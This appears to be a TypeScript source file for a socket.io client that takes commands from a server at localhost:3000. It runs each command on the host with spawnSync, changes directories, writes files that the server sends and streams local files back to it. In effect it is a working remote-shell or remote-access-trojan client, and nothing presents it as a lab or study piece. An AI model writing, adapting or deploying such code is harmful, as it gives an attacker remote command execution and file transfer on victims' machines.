import {io, Socket} from "socket.io-client";
import {spawnSync} from "child_process";
import * as fs from "fs";
// @ts-ignore
import ss from "socket.io-stream"
import stringArgv from "string-argv"

const socket = io("http://localhost:3000")

const replaceAll = (message: string, search: string, replace: string)=> {
    return message.replace(new RegExp(search, 'g'), replace)
}

class Client {
    private readonly socket: Socket;

    constructor() {
        this.socket = socket

        socket.on("connect", ()=>{
            socket.on("command", (data: any)=>{
                const isValid = data ?? true;
                const command = JSON.parse(data)

                if (isValid){
                    const output = this.executeCommand(command)

                    this.sendMessage(output)
                }
            })

            // @ts-ignore
            ss(socket).on("send-me-a-file",(stream: any, data: any)=>{
                const {name} = JSON.parse(data)

                stream.pipe(fs.createWriteStream(name))

                this.sendMessage("uploaded file.")
            })
        })
    }

    sendMessage(data: any){
        this.socket.emit("command", JSON.stringify(data))
    }

    executeCommand(message: string): string{
        const messagesArray = message.split(" ")

        switch (messagesArray[0]) {
            case "cd":
                try {
                    process.chdir(messagesArray[1])

                    return `Directory changed to ${messagesArray[1]}`
                }catch (error) {
                    return error.message
                }
                break
            case "quit":
                this.socket.disconnect()
                return ""
                break
            case "download":
                const fileName = messagesArray[1];

                const stream = ss.createStream()

                ss(this.socket).emit("send-me-a-file", stream, JSON.stringify({
                    name: fileName
                }))

                fs.createReadStream(fileName).pipe(stream)

                this.sendMessage("downloaded file.")

            default:
                const args = stringArgv(messagesArray.slice(1).join(" "))

                const command = spawnSync(messagesArray[0], args);

                const output = (command?.stderr?.toString() + command?.stdout?.toString()) ?? ""
                return output
        }
    }
}

const client = new Client()

